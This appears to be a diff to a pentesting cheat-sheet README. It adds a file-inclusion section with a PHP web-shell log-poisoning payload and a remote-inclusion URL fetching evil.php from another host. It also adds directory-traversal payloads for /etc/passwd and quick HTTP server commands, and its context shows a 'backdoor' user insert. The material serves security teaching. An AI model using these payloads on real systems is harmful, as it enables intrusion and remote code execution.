@@ -62,6 +62,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [SQL Injection](#sql-injection)
   - [Authentication vulnerabilities](#authentication-vulnerabilities)
   - [Directory Traversal](#directory-traversal)
+  - [File inclusion](#file-inclusion)
   - [OS Command Injection](#os-command-injection)
   - [Business logic vulnerabilities](#business-logic-vulnerabilities)
   - [Information Disclosure](#information-disclosure)
@@ -607,6 +608,11 @@ tcpdump -nX -r packets.pcap                                                     
 **For a temporary public server**
 - [XAMPP](https://www.apachefriends.org/) + [ngrok](https://ngrok.com/)
 - [beeceptor](https://beeceptor.com/)
+- `python -m SimpleHTTPServer 7331`
+- `python3 -m http.server 7331`
+- `php -S 0.0.0.0:8000`
+- `ruby -run -e httpd . -p 9000`
+- `busybox httpd -f -p 10000`
 
 **For auths**
 - [textverified.com](https://www.textverified.com/) for auths requiring a phone number
@@ -1276,6 +1282,9 @@ insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 
 ### <ins>Directory Traversal</ins>
 
+Directory traversal vulnerabilities allow an attacker to read local secret files. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb))
+
+**Exploitations / Bypasses**
 - simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
 - absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
 - stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
@@ -1287,6 +1296,16 @@ insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 - `windows\win.ini`
 - `c:\windows\system32\drivers\etc\hosts`
 - `etc/passwd`
+
+### <ins>File inclusion</ins>
+
+File inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb)).
+
+- **Local File Inclusion (LFI)**: execute a local file
+  1. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`. This payload will be saved in the logs
+  2. Perform a LFI with `http://10.11.0.220/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
+- **Remote File Inclusion (RFI)**: execute a remote file
+  - An example: `http://10.11.0.220/menu.php?file=http://10.11.0.4/evil.php`
 
 ### <ins>OS Command Injection</ins>
 
